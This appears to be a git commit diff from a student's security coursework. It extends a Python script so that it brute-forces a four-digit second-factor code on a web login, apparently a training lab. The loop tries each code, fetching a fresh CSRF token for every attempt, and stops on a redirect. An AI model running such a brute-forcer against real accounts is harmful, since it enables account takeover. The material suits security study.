cc2a27142b459929683ce858fe56ee96f0f4d680
Maksim Semchuk <semchuk2@pdx.edu>
2021-04-16 14:16:48 -0700

    added a loop and made sure  the base works

--- Lab Notebook #1/hw1/hw1.py
+++ Lab Notebook #1/hw1/hw1.py
@@ -7,12 +7,13 @@ import multiprocessing
 def Check_Second_Factor_Code(code_to_check):
     if code_to_check == 302:
         print(f'2fa valid with response code {resp.status_code}')
+        sys.exit(0)
         # Visit account profile page to complete level
     else:
         print(f'2fa invalid with response code: {resp.status_code}')
 
 
-def Login_to_account(logindata):
+def Login_to_account(logindata, factor_code):
     resp = s.post(login_url, data=logindata)
     print(f'Login response: {resp.text}')
 
@@ -22,7 +23,7 @@ def Login_to_account(logindata):
     login2_url = f'https://{site}/login2'
     login2data = {
         'csrf': csrf,
-        'mfa-code': str(0).zfill(4)
+        'mfa-code': str(factor_code).zfill(4)
     }
     resp = s.post(login2_url, data=login2data, allow_redirects=False)
     Check_Second_Factor_Code(resp.status_code)
@@ -36,15 +37,16 @@ if __name__ == '__main__':
 
     s = requests.Session()
     login_url = f'https://{site}/login'
-    resp = s.get(login_url)  # ONLY ONE, OTHERWISE CSRF CHANGES
-    soup = BeautifulSoup(resp.text, 'html.parser')
-    csrf = soup.find('input', {'name': 'csrf'}).get('value')
+    for factor_code in range(9999):
+        print(f'\n{factor_code}\n')
+        resp = s.get(login_url)  # new one each time, otherwise boot
+        soup = BeautifulSoup(resp.text, 'html.parser')
+        csrf = soup.find('input', {'name': 'csrf'}).get('value')
 
-    # Need to keep csrf the same, so do not do more then 1 GET
-    logindata = {
-        'csrf': csrf,
-        'username': 'carlos',
-        'password': 'montoya'
-    }
-    print(f'Logging in as carlos:montoya')
-    Login_to_account(logindata)
+        logindata = {
+            'csrf': csrf,
+            'username': 'carlos',
+            'password': 'montoya'
+        }
+        print(f'Logging in as carlos:montoya')
+        Login_to_account(logindata, factor_code)
